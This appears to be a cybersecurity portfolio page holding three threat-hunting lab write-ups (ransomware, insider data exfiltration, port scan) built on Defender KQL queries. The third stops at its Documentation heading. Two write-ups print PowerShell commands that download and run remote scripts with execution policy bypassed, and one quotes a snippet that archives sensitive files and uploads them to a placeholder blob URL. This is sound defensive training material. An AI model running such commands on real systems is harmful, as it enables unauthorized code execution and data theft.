1:"$Sreact.fragment"
2:I[9304,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"ThemeProvider"]
3:I[9241,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"CyberHeader"]
4:I[7555,[],""]
5:I[1295,[],""]
6:I[1024,["542","static/chunks/542-9c169102c7286aba.js","838","static/chunks/838-83c262eea6b250cb.js","345","static/chunks/app/not-found-f26a84874965db45.js"],"default"]
7:I[3063,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"Image"]
8:I[6874,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],""]
a:I[9665,[],"OutletBoundary"]
d:I[9665,[],"ViewportBoundary"]
f:I[9665,[],"MetadataBoundary"]
11:I[6614,[],""]
:HL["/_next/static/css/9771aacc16142aba.css","style"]
:HL["/_next/static/css/b5c3a1bf19425f6c.css","style"]
0:{"P":null,"b":"gB8xjAs73Ya8I_-QXZr5a","p":"","c":["",""],"i":false,"f":[[["",{"children":["__PAGE__",{}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9771aacc16142aba.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/b5c3a1bf19425f6c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","suppressHydrationWarning":true,"children":[["$","head",null,{"children":["$","script",null,{"defer":true,"src":"https://cloud.umami.is/script.js","data-website-id":"1c0f224c-1fe0-4093-a4e2-c43cb8c84bfa"}]}],["$","body",null,{"className":"__className_f367f3","children":["$","$L2",null,{"attribute":"class","defaultTheme":"light","disableTransitionOnChange":true,"children":["$","div",null,{"className":"flex min-h-screen flex-col","children":[["$","$L3",null,{}],["$","main",null,{"className":"flex-1 pt-16","children":["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"bg-background py-5 border-t border-border","children":["$","div",null,{"className":"container mx-auto px-4 md:px-6","children":[["$","div",null,{"className":"grid grid-cols-1 md:grid-cols-3 gap-4","children":[["$","div",null,{"className":"space-y-2","children":[["$","div",null,{"className":"flex items-center","children":["$","div",null,{"className":"relative w-[3.6rem] h-[3.6rem]","children":["$","$L7",null,{"src":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png","alt":"117 SECOPS Logo","fill":true,"className":"object-contain"}]}]}],["$","p",null,{"className":"text-sm text-muted-foreground max-w-xs","children":"Cybersecurity professional specializing in protecting digital assets from evolving threats."}],["$","div",null,{"className":"pt-0","children":["$","a",null,{"href":"https://www.linkedin.com/in/otori-samson/","target":"_blank","rel":"noopener noreferrer","children":"Contact Me","className":"inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-9 rounded-md px-3 cyber-border bg-transparent text-foreground hover:bg-purple-600 hover:text-white","ref":null}]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Quick Links"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"children":["$","$L8",null,{"href":"/","className":"text-sm text-muted-foreground hover:text-primary","children":"Home"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/blog","className":"text-sm text-muted-foreground hover:text-primary","children":"Blog"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/projects","className":"text-sm text-muted-foreground hover:text-primary","children":"Projects"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/portfolio","className":"text-sm text-muted-foreground hover:text-primary","children":"Portfolio"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/about","className":"text-sm text-muted-foreground hover:text-primary","children":"About"}]}]]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Areas of Expertise"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"className":"text-sm text-muted-foreground","children":"Security Assessment"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Penetration Testing"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Secure Development"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Incident Response"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Compliance"}]]}]]}]]}],["$","div",null,{"className":"border-t border-border mt-5 pt-3 flex flex-col md:flex-row justify-between items-center","children":["$","p",null,{"className":"text-sm text-muted-foreground","children":["© ",2025," Samson's. Personal cybersecurity portfolio."]}]}]]}]}]]}]}]}]]}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9","$undefined",null,["$","$La",null,{"children":["$Lb","$Lc",null]}]]}],{},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","OW925FPi1_t9k2idBKkU7",{"children":[["$","$Ld",null,{"children":"$Le"}],null]}],["$","$Lf",null,{"children":"$L10"}]]}],false]],"m":"$undefined","G":["$11","$undefined"],"s":false,"S":true}
12:I[3946,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","974","static/chunks/app/page-223c537418df4912.js"],"CyberHero"]
13:I[1824,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","974","static/chunks/app/page-223c537418df4912.js"],"CyberFeaturedProjects"]
17:I[5448,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","974","static/chunks/app/page-223c537418df4912.js"],"CyberFeaturedBlogPosts"]
14:T2e31,
## Introduction

This investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.

Using Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables — DeviceFileEvents and DeviceProcessEvents — was analyzed to reconstruct the attack sequence.

## Scenario Overview

A new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.

During lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:

"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin to…"

The task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.

## Preparation

Prior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.

The first step was to establish a baseline of file activity to identify when the anomaly began.

## Data Collection

The analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(30m)
| summarize FileEvents = count() by bin(Timestamp, 5m)
| order by Timestamp asc
-------------------------------------------------------

Result: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.

## Data Analysis

### A. Mass File Modification and Extension Changes

To examine which file types were most affected, the following query was run:

-------------------------------------------------------
kql
DeviceFileEvents
| where DeviceName == VMName
| where ActionType in ("FileRenamed","FileCreated","FileModified")
| extend ext = tostring(split(FileName,".")[-1])
| summarize Count = count() by ext
| order by Count desc
-------------------------------------------------------

Observation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes — but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.

### B. Folder-Level Analysis (Staging Behaviour)

To determine where encryption occurred:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where ActionType == "FileCreated"
| summarize count() by Folder = extract(@"^(.*)\\[^\\]+$",1,FileName)
| order by count_ desc
-------------------------------------------------------

Result: High activity was isolated to a single user folder — C:\Users\samson\Desktop — confirming that encryption primarily targeted the Desktop directory.

### C. Identifying Script Execution

The next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where FileName has_any ("powershell","pwsh","cmd.exe","wscript.exe","cscript.exe","wmic.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:

ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {...}"

The initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.

### D. Tracing Child Processes and Persistence Mechanisms

To verify what PowerShell spawned:

-------------------------------------------------------
kql
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\Users\samson\AppData\Local\Temp — a common ransomware staging area.

### E. File Events Linked to User Folders

To focus on desktop encryption evidence:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(24h)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has_any("Desktop","\\Users\\")
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
-------------------------------------------------------

Result:

A file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.

### F. Process Chain Correlation – Root Cause Determination

Finally, to reconstruct the infection path:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between (ago(120m) .. now())
| where FileName in~ ("powershell.exe","cmd.exe","services.exe","svchost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
-------------------------------------------------------

Findings:

1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.
2. This instance spawned cmd.exe, which registered background services.
3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.
4. These service-hosted processes performed the encryption routines on user data.

<InlineGallery images={pwncrypt-ransomware-investigation} title="PwnCrypt Ransomware Investigation and Analysis Process" />

## Investigation Summary

The analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.

Execution Chain:
senseir.exe → powershell.exe → cmd.exe → services.exe → svchost.exe → file encryption (.pwncrypt)

## Response and Containment

1. Isolated the compromised VM from the network using Defender's Isolate Device function.
2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.
3. Recommended a complete VM rebuild to remove any residual persistence.
4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.
5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.

## Documentation

Each phase of this investigation — preparation, data collection, analysis, and response — was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.

All queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.

## MITRE ATT&CK Mapping

The PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT&CK framework.

1. **Initial Access (T1204.002 – User Execution)**: Infection began through manual execution of a malicious PowerShell script.
2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.
3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.
4. **Privilege Escalation & Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.
5. **Discovery (T1082)**: Enumerated user directories such as C:\Users\samson\Desktop before encryption.
6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).

Overall, the attack followed a full ransomware kill chain — Execution → Persistence → Privilege Escalation → Defence Evasion → Impact — demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.

## Improvement and Lessons Learned

1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.
2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.
3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.
4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.
5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.

## Conclusion

The investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.

Although contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.

Through disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
15:T290f,
## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL – Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL – Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 – PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 – Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 – Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 – Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 – System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
16:T3430,
## Introduction

This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.

The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.

This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.

## Scenario Overview

The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.

The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.

## Preparation

Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.

<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />

### PowerShell Command
-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-------------------------------------------------------

This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.

After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.

## Data Collection

Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.

I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.

### KQL Check for Recent Network Logs
-------------------------------------------------------
kql
DeviceNetworkEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.

In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.

## Data Analysis

The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.

### KQL – Count Failed Connections
-------------------------------------------------------
kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionsAttempts desc
-------------------------------------------------------

When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.

To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.

### KQL – Inspect All Failed Connections from a Specific IP
-------------------------------------------------------
kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
-------------------------------------------------------

Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.

At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.

<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />

## Investigation

To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.

### KQL – Correlate Process Activity around the Port Scan Time
-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.

Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.

### Snippet of the observed PowerShell script:
-------------------------------------------------------
powershell
for ($i=4; $i -le 10; $i++) {
   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
}
-------------------------------------------------------

Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.

After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.

<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />

## Response and MITRE ATT&CK Mapping

This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:

1. **Reconnaissance (T1046 – Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
2. **Execution (T1059.001 – PowerShell)**: The PowerShell script was used as the execution medium for network probing.
3. **Privilege Escalation (T1078 – Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
4. **Lateral Movement (T1021 – Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.

By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.

## Documentation

